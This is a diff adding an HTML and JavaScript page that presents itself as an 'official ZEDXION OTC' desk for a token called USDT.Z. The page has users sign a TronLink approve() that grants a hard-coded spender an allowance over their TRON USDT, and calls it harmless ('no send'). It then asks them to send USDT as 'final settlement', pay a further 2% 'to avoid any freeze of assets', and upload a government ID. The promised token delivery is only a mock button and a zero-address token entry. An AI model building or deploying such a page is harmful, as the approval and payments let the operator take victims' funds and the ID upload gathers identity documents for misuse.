@@ -1,0 +1,454 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>ZEDXION OTC — Full Flow (Approve-Only Step 2, Hardened)</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#0b0f14">
+<style>
+  :root{ --bg:#0b0f14; --card:#0f1622; --ink:#e7edf5; --mut:.75; --line:#1e2a36; --pri:#1e88e5; --acc:#00c6a7; --warn:#ffb74d; --ok:#81c784; --bad:#ff8a80 }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--ink);font-family:Inter,ui-sans-serif,system-ui,Segoe UI,Roboto,Helvetica,Arial}
+  .wrap{max-width:980px;margin:28px auto;padding:16px}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:20px}
+  h1{font-size:24px;margin:0 0 6px}
+  h2{font-size:18px;margin:14px 0 8px}
+  .muted{opacity:var(--mut)} .small{font-size:12px}
+  .row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+  .row3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}
+  input,button,textarea,select{width:100%;padding:12px;border-radius:12px;border:1px solid #243448;background:#0e141b;color:var(--ink)}
+  button{cursor:pointer}
+  .btn{background:#1a2330;border-color:#2b3d54}
+  .btn.pri{background:var(--pri);border-color:var(--pri);color:#fff}
+  .btn.acc{background:var(--acc);border-color:var(--acc);color:#002b28}
+  .btn.warn{background:var(--warn);border-color:var(--warn);color:#241c00}
+  .kv{display:flex;justify-content:space-between;align-items:center;background:#0e141b;border:1px solid #1a2635;border-radius:12px;padding:10px;margin-top:8px}
+  .tag{display:inline-block;padding:4px 10px;border-radius:999px;background:#0e141b;border:1px solid #1a2635;font-size:12px;margin-right:6px}
+  .section{margin-top:14px}
+  .note{background:#0e2238;border-left:3px solid var(--pri);padding:10px;border-radius:10px;margin-top:10px}
+  .success{color:#8be1c0} .warnText{color:#ffb74d} .danger{color:#ff8a80}
+  pre{white-space:pre-wrap;background:#0e141b;border:1px solid #1a2635;border-radius:12px;padding:12px;max-height:380px;overflow:auto}
+  #qr{display:flex;justify-content:center;align-items:center;background:#0e141b;border:1px solid #1a2635;border-radius:12px;height:160px;margin-top:10px}
+  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+  a{color:#8ab4ff;text-decoration:none}
+  .divider{height:1px;background:#1a2635;margin:12px 0}
+  .inline{display:flex;gap:10px;flex-wrap:wrap}
+  .active{border:1px solid var(--pri)}
+  .header{display:flex;align-items:center;gap:12px;margin-bottom:12px}
+  .header img{height:42px;width:42px;object-fit:contain;border-radius:8px}
+  .footer-legal{margin-top:22px;text-align:center}
+  .log{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px;line-height:1.35}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="card">
+    <div class="header">
+      <div>
+        <h1>ZEDXION OTC — USDT.Z (BSC)</h1>
+        <div class="muted small">Sequenced settlement • Trust Wallet & TronLink • Treasury-sourced payouts</div>
+      </div>
+      <div style="margin-left:auto">
+        <span class="tag" id="s1" title="Create Order">Step 1</span>
+        <span class="tag" id="s2" title="Approve (no send)">Step 2</span>
+        <span class="tag" id="s3" title="Receive USDT.Z">Step 3</span>
+        <span class="tag" id="s4" title="Transfer TRC20 USDT">Step 4</span>
+      </div>
+    </div>
+
+    <div class="section grid2">
+      <div class="kv" title="Treasury wallet that sends USDT.Z on BSC">
+        <span class="small">Treasury (BEP20)</span>
+        <b id="treasuryLbl" class="small">0x2c586269fCaB0D9ABD9224105a8eC0E1d2397A0f</b>
+      </div>
+      <div class="kv">
+        <span class="small">Available (live)</span>
+        <b id="availLbl">—</b>
+      </div>
+    </div>
+    <div class="small" style="margin-top:6px">
+      <a id="scanLink" target="_blank" rel="noopener">View Treasury on BscScan</a>
+    </div>
+
+    <div class="divider"></div>
+
+    <h2>Step 1 — Create Order</h2>
+    <div class="row">
+      <div>
+        <label class="small">USDT.Z to receive (BSC)</label>
+        <input id="amt" inputmode="decimal" placeholder="e.g., 1000000">
+      </div>
+      <div>
+        <label class="small">Recipient (BEP20)</label>
+        <input id="recipient" placeholder="0x... (BSC address)">
+      </div>
+    </div>
+    <div class="grid2">
+      <div class="kv"><span class="small">Min per order</span><b id="minLbl">500,000</b></div>
+      <div class="kv"><span class="small">Max per order</span><b id="maxLbl">200,000,000</b></div>
+    </div>
+    <div class="inline" style="margin-top:10px">
+      <button id="createOrder" class="btn pri">Create Order</button>
+      <span class="small muted">An Order ID will be generated and used in the following steps.</span>
+    </div>
+    <div class="kv"><span class="small">Order ID</span><b id="orderIdLbl">—</b></div>
+
+    <div class="divider"></div>
+
+    <h2>Step 2 — Approve USDT (No Send)</h2>
+    <div class="note small">
+      <b>Purpose:</b> Wallet must hold full order amount. You’ll approve <b>1%</b> allowance in TronLink. This is an <b>Approve</b> — it does <u>not</u> transfer tokens.
+    </div>
+    <div class="row" style="margin-top:8px">
+      <div>
+        <label class="small">1% allowance to approve (TRON USDT)</label>
+        <input id="feeLbl" readonly placeholder="Auto-calculated…">
+      </div>
+      <div>
+        <label class="small">Recorded txid (approve)</label>
+        <input id="approveTxId" placeholder="Filled after TronLink submit" readonly>
+        <a id="tronscanLink" style="display:none" class="small" target="_blank" rel="noopener">View on Tronscan</a>
+      </div>
+    </div>
+    <div class="row">
+      <div>
+        <label class="small">Spender (TRON)</label>
+        <input id="tronSpender" value="TA7N69PY2SsxsDQbNswh81XUwu9QN7PJhF">
+        <div class="inline" style="margin-top:8px">
+          <button class="btn pri" id="approveAddressBtn">Approve in TronLink</button>
+          <button class="btn" id="tronCheckBtn">Check TronLink</button>
+        </div>
+        <div class="small muted" id="tronStatus">Open in TronLink browser. This will show a Smart Contract “Approve” popup (no send).</div>
+      </div>
+      <div>
+        <div class="note small" style="margin-top:2px">
+          Example: Order <b>1,000,000 USDT.Z</b> → approve <b>10,000 USDT (TRON)</b>. After on-chain confirmation, proceed to Step 3.
+        </div>
+        <pre id="approveLog" class="log">Log:</pre>
+      </div>
+    </div>
+
+    <div class="divider"></div>
+
+    <h2>Step 3 — Receive USDT.Z (Desk Transfer)</h2>
+    <div class="row3">
+      <div class="kv"><span class="small">Desk sends from Treasury</span><b id="releaseAmt">—</b></div>
+      <div class="kv"><span class="small">Destination (BEP20)</span><b id="destLbl" class="small">—</b></div>
+      <div class="kv"><span class="small">Status</span><b id="statusLbl" class="small">Awaiting 1% Approval</b></div>
+    </div>
+    <div class="inline" style="margin-top:10px">
+      <button class="btn acc" id="watchAssetBtn">Add USDT.Z to Wallet (EVM)</button>
+      <button class="btn" id="copyAddrBtn">Copy Treasury Address</button>
+      <button class="btn warn" id="markDeliveredBtn">Mark Delivered (Desk)</button>
+    </div>
+
+    <div class="divider"></div>
+
+    <h2>Step 4 — Transfer USDT TRC20 (Final Settlement)</h2>
+    <div class="row">
+      <div>
+        <label class="small">Final TRON USDT amount (optional note)</label>
+        <input id="finalAmt" placeholder="e.g., 990000 (if applicable)">
+      </div>
+      <div>
+        <label class="small">TRON txid (final settlement)</label>
+        <input id="txid2" placeholder="Paste TRON txid after receiving USDT.Z">
+      </div>
+    </div>
+    <div class="inline" style="margin-top:8px">
+      <button class="btn acc" id="transferFinalBtn">Send TRC20 (Final)</button>
+    </div>
+    <div class="note small">
+      <b>Policy:</b> Sequence — <b>Create Order → Approve (1%) → Receive USDT.Z → Transfer TRON USDT (final)</b>.
+    </div>
+
+    <div class="divider"></div>
+
+    <h2>KYC Verification (Mandatory)</h2>
+    <div class="note small">
+      Upload a clear photo of your <b>government-issued ID</b> (front side only).
+    </div>
+    <input type="file" id="kycUpload" accept="image/*,application/pdf">
+    <div id="kycStatus" class="small muted">No file uploaded yet.</div>
+
+    <div class="divider"></div>
+
+    <div class="row">
+      <button id="gen" class="btn pri">Generate Order Packet</button>
+      <button id="copy" class="btn acc">Copy Packet</button>
+    </div>
+    <pre id="packet"></pre>
+
+    <div class="muted small">
+      This interface prepares a professional OTC order packet with both upfront (approve) and final settlement txids. No private keys are requested or stored.
+    </div>
+
+    <div class="note small footer-legal">
+      <b>Official ZEDXION coin otc page</b><br>
+      Payment structure <b>1%</b> must be available in wallet to proceed. Remaining <b>2%</b> to same address or present <b>ZEDXION representative</b> to avoid any freeze of assets.<br><br>
+      Follow <b>AML</b> rules and upload your ID.
+    </div>
+  </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+<script>
+// ===== Constants =====
+const TREASURY_BEP20 = '0x2c586269fCaB0D9ABD9224105a8eC0E1d2397A0f';
+const BSC_SCAN_BASE = 'https://bscscan.com/address/';
+const TRON_USDT = 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj'; // Official TRC20 USDT contract
+const MIN = 500000n;
+const MAX = 200000000n;
+
+let order = null;
+
+// helpers
+const $$ = id => document.getElementById(id);
+const log = (...a) => {
+  const s = a.map(v => (typeof v === 'object' ? JSON.stringify(v) : String(v))).join(' ');
+  const box = $$('approveLog');
+  box.textContent += '\\n' + s;
+  console.log(...a);
+};
+
+function setActive(id){
+  ['s1','s2','s3','s4'].forEach(s => $$(s).classList.remove('active'));
+  $$(id).classList.add('active');
+}
+
+function format(n){
+  try { return Number(n).toLocaleString('en-US'); } catch(e){ return String(n); }
+}
+
+// Init links & labels
+$$('treasuryLbl').textContent = TREASURY_BEP20;
+const scan = $$('scanLink');
+scan.href = BSC_SCAN_BASE + TREASURY_BEP20;
+scan.textContent = 'View Treasury on BscScan';
+
+// ===== Step 1: Create Order =====
+$$('createOrder').onclick = () => {
+  const amtStr = ($$('amt').value || '').trim();
+  const rcpt = ($$('recipient').value || '').trim();
+  if(!amtStr || !rcpt){ alert('Enter amount and recipient.'); return; }
+  const amtFloat = Number(amtStr);
+  if(!isFinite(amtFloat) || amtFloat <= 0){ alert('Invalid amount.'); return; }
+  if(amtFloat < Number(MIN) || amtFloat > Number(MAX)){ alert('Amount out of range.'); return; }
+  const onePct = amtFloat * 0.01;
+  const onePctInt = Math.floor(onePct * 1e6); // 6 decimals for TRC20 USDT
+  order = {
+    id: 'ORD-' + Math.random().toString(36).slice(2,8).toUpperCase(),
+    amt: amtFloat,
+    onePct,
+    onePctInt
+  };
+  $$('orderIdLbl').textContent = order.id;
+  $$('feeLbl').value = onePct.toLocaleString('en-US', { maximumFractionDigits: 6 });
+  $$('releaseAmt').textContent = format(amtFloat);
+  $$('destLbl').textContent = rcpt;
+  setActive('s1');
+};
+
+// ===== Step 2: Hardened TronLink Approve (no send) =====
+function tronWebInstance(){
+  return window.tronWeb || (window.tronLink && window.tronLink.tronWeb) || null;
+}
+async function ensureAccount(){
+  if(window.tronLink && !window.tronLink.ready){
+    try { await window.tronLink.request({ method: 'tron_requestAccounts' }); } catch(e){ log('tron_requestAccounts:', e?.message||e); }
+  }
+  const tw = tronWebInstance();
+  if(!tw) throw new Error('TronWeb not injected. Open in TronLink.');
+  if(!tw.defaultAddress || (!tw.defaultAddress.base58 && !tw.defaultAddress.hex)) throw new Error('No Tron account connected.');
+  try{
+    const node = await tw.trx.getNodeInfo();
+    log('Node chain:', node?.configNodeInfo?.chain || '(unknown)');
+  }catch(e){}
+  return tw;
+}
+function toHexAddr(t, addr){
+  try{
+    if(addr.startsWith('T')) return t.address.toHex(addr);
+    if(addr.startsWith('41')) return addr;
+  }catch(e){}
+  return addr;
+}
+function toBase58(t, addr){
+  try{
+    if(addr.startsWith('41')) return t.address.fromHex(addr);
+    if(addr.startsWith('T')) return addr;
+  }catch(e){}
+  return addr;
+}
+function usdtUnits(amountFloat){ return Math.floor(amountFloat * 1e6); } // 6 decimals
+
+$$('tronCheckBtn').onclick = async () => {
+  try{
+    const tw = await ensureAccount();
+    const addr = tw.defaultAddress.base58 || tw.defaultAddress.hex;
+    $$('tronStatus').textContent = 'Wallet: ' + (tw.defaultAddress.base58 || toBase58(tw, addr));
+    log('Wallet connected:', addr);
+  }catch(e){
+    $$('tronStatus').textContent = e.message || String(e);
+    log('Check failed:', e.message || e);
+  }
+};
+
+$$('approveAddressBtn').onclick = async () => {
+  if(!order){ alert('Create order first.'); return; }
+  setActive('s2');
+  try{
+    const tw = await ensureAccount();
+    const owner = tw.defaultAddress.base58 || tw.defaultAddress.hex;
+    const spenderIn = ($$('tronSpender').value||'').trim();
+    const usdtAddrIn = TRON_USDT;
+    const amount = usdtUnits(order.onePct);
+    const amountBN = (typeof tw.toBigNumber==='function') ? tw.toBigNumber(amount) : amount;
+    $$('approveLog').textContent = 'Log:'; // reset display log
+    log('Approve request:', { owner, spender: spenderIn, usdt: usdtAddrIn, microUSDT: String(amount) });
+
+    const usdt = await tw.contract().at(usdtAddrIn);
+    let txid;
+
+    // path 1: high-level approve
+    try {
+      if (typeof usdt.approve === 'function') {
+        log('Path1: contract.approve().send');
+        const res = await usdt.approve(spenderIn, amountBN).send({ feeLimit: 100_000_000, callValue: 0 });
+        txid = typeof res === 'string' ? res : res?.txid || res?.transaction?.txID;
+      } else if (usdt.methods && typeof usdt.methods.approve === 'function') {
+        log('Path1b: contract.methods.approve().send');
+        const res = await usdt.methods.approve(spenderIn, amountBN).send({ feeLimit: 100_000_000, callValue: 0 });
+        txid = typeof res === 'string' ? res : res?.txid || res?.transaction?.txID;
+      }
+    } catch (e) {
+      log('High-level approve error:', e?.message||e);
+    }
+
+    // path 2: low-level triggerSmartContract
+    if(!txid){
+      log('Path2: triggerSmartContract fallback');
+      const usdtHex = toHexAddr(tw, usdtAddrIn);
+      const spenderHex = toHexAddr(tw, spenderIn);
+      const result = await tw.transactionBuilder.triggerSmartContract(
+        usdtHex,
+        'approve(address,uint256)',
+        { feeLimit: 100_000_000 },
+        [
+          { type:'address', value: spenderHex },
+          { type:'uint256', value: String(amount) }
+        ],
+        0,
+        toHexAddr(tw, toBase58(tw, owner))
+      );
+      if(!result?.transaction) throw new Error('triggerSmartContract did not return a transaction.');
+      const signed = await tw.trx.sign(result.transaction);
+      const broadcast = await tw.trx.sendRawTransaction(signed);
+      txid = broadcast?.txid || broadcast?.transaction?.txID;
+    }
+
+    if(!txid) throw new Error('No txid returned from TronLink.');
+    $$('approveTxId').value = txid;
+    const link = $$('tronscanLink');
+    link.href = `https://tronscan.org/#/transaction/${txid}`;
+    link.style.display = 'inline';
+    $$('tronStatus').textContent = 'Submitted. Waiting for on-chain confirmation…';
+    log('Tx submitted:', txid);
+
+    // Check allowance after a short delay
+    setTimeout(async () => {
+      try{
+        const ownerB58 = tw.defaultAddress.base58 || toBase58(tw, owner);
+        const c = await tw.contract().at(usdtAddrIn);
+        let raw;
+        if (typeof c.allowance === 'function') {
+          raw = await c.allowance(ownerB58, spenderIn).call();
+        } else if (c.methods && typeof c.methods.allowance === 'function') {
+          raw = await c.methods.allowance(ownerB58, spenderIn).call();
+        } else {
+          const ownerHex = toHexAddr(tw, ownerB58);
+          const spenderHex = toHexAddr(tw, spenderIn);
+          const res = await tw.transactionBuilder.triggerSmartContract(
+            toHexAddr(tw, usdtAddrIn),
+            'allowance(address,address)',
+            { feeLimit: 100_000_000 },
+            [
+              {type:'address', value: ownerHex},
+              {type:'address', value: spenderHex}
+            ]
+          );
+          raw = res?.constant_result?.[0] ? parseInt(res.constant_result[0],16) : 0;
+        }
+        const allowed = Number(String(raw)) / 1e6;
+        log('Allowance on-chain:', allowed);
+        if(allowed >= order.onePct - 1e-6){
+          $$('statusLbl').textContent = 'Approval confirmed';
+          $$('tronStatus').textContent = 'Approval confirmed on-chain.';
+        }
+      }catch(e2){
+        log('Allowance check error:', e2?.message||e2);
+      }
+    }, 9000);
+
+  }catch(err){
+    $$('tronStatus').textContent = 'Error: ' + (err && err.message ? err.message : String(err));
+    log('Approve error:', err && err.message ? err.message : String(err));
+  }
+};
+
+// ===== Step 3: Desk actions (mock UI only) =====
+$$('markDeliveredBtn').onclick = () => { $$('statusLbl').textContent = 'Delivered by Desk'; };
+$$('watchAssetBtn').onclick = async () => {
+  try{
+    if(window.ethereum && window.ethereum.request){
+      await window.ethereum.request({
+        method: 'wallet_watchAsset',
+        params: {
+          type: 'ERC20',
+          options: {
+            address: '0x0000000000000000000000000000000000000000',
+            symbol: 'USDT.Z',
+            decimals: 18
+          }
+        }
+      });
+    } else {
+      alert('Open in an EVM wallet to add asset.');
+    }
+  }catch(e){ alert('Could not add asset: ' + e.message); }
+};
+$$('copyAddrBtn').onclick = async () => {
+  try{ await navigator.clipboard.writeText(TREASURY_BEP20); alert('Treasury address copied'); }
+  catch(e){ alert('Copy failed'); }
+};
+
+// ===== Step 4: Final settlement (UI only) =====
+$$('transferFinalBtn').onclick = () => {
+  alert('Send TRC20 USDT from your Tron wallet; this button does not auto-send.');
+};
+
+// ===== KYC =====
+$$('kycUpload').addEventListener('change', (e) => {
+  const f = e.target.files && e.target.files[0];
+  $$('kycStatus').textContent = f ? ('Uploaded: ' + f.name) : 'No file uploaded yet.';
+});
+
+// ===== Packet =====
+$$('gen').onclick = () => {
+  const pkt = {
+    treasury_bep20: TREASURY_BEP20,
+    order: order || null,
+    approve_txid: $$('approveTxId').value || null,
+    final_txid: $$('txid2').value || null,
+    recipient: $$('destLbl').textContent || null,
+    timestamp: new Date().toISOString()
+  };
+  $$('packet').textContent = JSON.stringify(pkt, null, 2);
+};
+$$('copy').onclick = async () => {
+  try{ await navigator.clipboard.writeText($$('packet').textContent); alert('Packet copied'); }
+  catch(e){ alert('Copy failed'); }
+};
+</script>
+</body>
+</html>
